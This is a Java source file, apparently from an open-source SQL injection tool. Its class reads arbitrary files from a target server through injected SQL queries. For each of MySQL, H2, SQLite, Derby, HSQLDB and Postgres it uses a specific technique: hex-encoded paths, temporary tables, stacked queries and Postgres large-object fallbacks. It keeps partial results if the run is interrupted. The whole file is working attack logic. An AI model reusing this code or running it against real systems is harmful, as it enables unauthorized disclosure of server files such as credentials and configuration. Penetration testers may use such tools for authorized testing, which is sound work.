package com.jsql.model.accessible;

import com.jsql.model.InjectionModel;
import com.jsql.model.bean.database.MockElement;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.LoopDetectedSlidingException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.vendor.model.VendorYaml;
import com.jsql.model.suspendable.SuspendableGetRows;
import com.jsql.util.LogLevelUtil;
import org.apache.commons.codec.binary.Hex;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.nio.charset.StandardCharsets;
import java.util.concurrent.Callable;

/**
 * Thread unit to read source of a file by SQL injection.
 * User can interrupt the process and get a partial result of the file content.
 */
public class CallableFile implements Callable<CallableFile> {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();
    private static final String REQUIRE_STACK = "Read file requirement : stack query";

    /**
     * Path to the file to read.
     */
    private final String pathFile;

    /**
     * Source of file.
     */
    private String sourceFile = StringUtils.EMPTY;
    
    /**
     * Suspendable task that reads lines of the file by injection.
     */
    private final SuspendableGetRows suspendableReadFile;

    private final InjectionModel injectionModel;
    
    /**
     * Create Callable to read a file.
     */
    public CallableFile(String pathFile, InjectionModel injectionModel) {
        this.pathFile = pathFile;
        this.injectionModel= injectionModel;
        this.suspendableReadFile = new SuspendableGetRows(injectionModel);
    }
    
    /**
     * Read a file on the server using SQL injection.
     * Get partial result if user interrupts the process.
     */
    @Override
    public CallableFile call() throws Exception {
        var sourcePage = new String[]{ StringUtils.EMPTY };

        String resultToParse = StringUtils.EMPTY;
        try {
            if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getMysql()) {
                LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Read file requirement : user FILE privilege");
                resultToParse = this.suspendableReadFile.run(
                    this.injectionModel.getResourceAccess().getExploitMysql().getModelYaml().getFile().getRead().replace(
                        VendorYaml.FILEPATH_HEX,
                        Hex.encodeHexString(this.pathFile.getBytes(StandardCharsets.UTF_8))
                    ),
                    sourcePage,
                    false,
                    1,
                    MockElement.MOCK,
                    ResourceAccess.FILE_READ
                );
            } else if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getH2()) {
                resultToParse = this.suspendableReadFile.run(
                    String.format(
                        this.injectionModel.getResourceAccess().getExploitH2().getModelYaml().getFile().getReadFromPath(),
                        this.pathFile
                    ),
                    sourcePage,
                    false,
                    1,
                    MockElement.MOCK,
                    ResourceAccess.FILE_READ
                );
            } else if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getSqlite()) {
                LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Read file requirement : extension fileio loaded");
                resultToParse = this.suspendableReadFile.run(
                    String.format(
                        this.injectionModel.getResourceAccess().getExploitSqlite().getModelYaml().getExtension().getFileioRead(),
                        this.pathFile
                    ),
                    sourcePage,
                    false,
                    1,
                    MockElement.MOCK,
                    ResourceAccess.FILE_READ
                );
            } else if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getDerby()) {
                LOGGER.log(LogLevelUtil.CONSOLE_INFORM, CallableFile.REQUIRE_STACK);
                var nameTable = RandomStringUtils.secure().nextAlphabetic(8);
                this.injectionModel.injectWithoutIndex(String.format(
                    this.injectionModel.getResourceAccess().getExploitDerby().getModelYaml().getFile().getCreateTable(),
                    nameTable,
                    nameTable, this.pathFile
                ), ResourceAccess.TBL_FILL);
                resultToParse = this.suspendableReadFile.run(
                    String.format(
                        this.injectionModel.getResourceAccess().getExploitDerby().getModelYaml().getFile().getRead(),
                        nameTable
                    ),
                    sourcePage,
                    true,
                    0,
                    MockElement.MOCK,
                    ResourceAccess.FILE_READ
                );
            } else if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getHsqldb()) {
                LOGGER.log(LogLevelUtil.CONSOLE_INFORM, CallableFile.REQUIRE_STACK);
                var nameTable = RandomStringUtils.secure().nextAlphabetic(8);
                this.injectionModel.injectWithoutIndex(String.format(
                    this.injectionModel.getResourceAccess().getExploitHsqldb().getModelYaml().getFile().getRead().getCreateTable(),
                    nameTable,
                    nameTable, this.pathFile
                ), ResourceAccess.TBL_FILL);
                resultToParse = this.suspendableReadFile.run(
                    String.format(
                        this.injectionModel.getResourceAccess().getExploitHsqldb().getModelYaml().getFile().getRead().getResult(),
                        VendorYaml.TRAIL_SQL,
                        nameTable
                    ),
                    sourcePage,
                    false,
                    1,
                    MockElement.MOCK,
                    ResourceAccess.TBL_READ
                );
            } else if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getPostgres()) {
                try {
                    resultToParse = this.suspendableReadFile.run(
                        String.format(
                            this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getRead().getFromDataFolder(),
                            this.pathFile
                        ),
                        sourcePage,
                        false,
                        1,
                        MockElement.MOCK,
                        ResourceAccess.FILE_READ
                    );
                } catch (InjectionFailureException e) {
                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read data folder failure, trying with large object");
                    var loid = this.injectionModel.getResourceAccess().getResultWithCatch(String.format(
                        this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getRead().getLargeObject().getFromPath(),
                        this.pathFile
                    ), ResourceAccess.ADD_LOID);
                    if (StringUtils.isNotEmpty(loid)) {
                        resultToParse = this.injectionModel.getResourceAccess().getResultWithCatch(String.format(
                            this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getRead().getLargeObject().getToText(),
                            loid
                        ), ResourceAccess.READ_LOID);
                    }
                    if (StringUtils.isEmpty(resultToParse)) {
                        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read large object failure, trying with stack read");
                        var nameLibraryRandom = "tmp_" + RandomStringUtils.secure().nextAlphabetic(8);  // no dash in table name
                        this.injectionModel.injectWithoutIndex(String.format(
                            this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getWrite().getTempTable().getDrop(),
                            nameLibraryRandom
                        ), ResourceAccess.TBL_DROP);
                        this.injectionModel.injectWithoutIndex(String.format(
                            this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getWrite().getTempTable().getAdd(),
                            nameLibraryRandom
                        ), ResourceAccess.TBL_CREATE);
                        this.injectionModel.injectWithoutIndex(String.format(
                            this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getWrite().getTempTable().getFill(),
                            nameLibraryRandom,
                            this.pathFile
                        ), ResourceAccess.TBL_FILL);
                        resultToParse = this.suspendableReadFile.run(
                            String.format(
                                this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getRead().getFromTempTable(),
                                nameLibraryRandom
                            ),
                            sourcePage,
                            false,
                            1,
                            MockElement.MOCK,
                            ResourceAccess.TBL_READ
                        );
                    }
                }
            } else {
                LOGGER.log(
                    LogLevelUtil.CONSOLE_DEFAULT,
                    "Read file not implemented for [{}], share a working example to GitHub to speed up release",
                    this.injectionModel.getMediatorVendor().getVendor()
                );
            }
        } catch (InjectionFailureException e) {
            // Usually thrown if File does not exist
            LOGGER.log(LogLevelUtil.IGNORE, e);
        } catch (LoopDetectedSlidingException | StoppedByUserSlidingException e) {
            // Get partial source
            if (StringUtils.isNotEmpty(e.getSlidingWindowAllRows())) {
                resultToParse = e.getSlidingWindowAllRows();
            } else if (StringUtils.isNotEmpty(e.getSlidingWindowCurrentRows())) {
                resultToParse = e.getSlidingWindowCurrentRows();
            }
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e);
        }
        
        this.sourceFile = resultToParse;
        return this;
    }


    // Getters
    
    public String getPathFile() {
        return this.pathFile;
    }

    public String getSourceFile() {
        return this.sourceFile;
    }

    public SuspendableGetRows getSuspendableReadFile() {
        return this.suspendableReadFile;
    }
}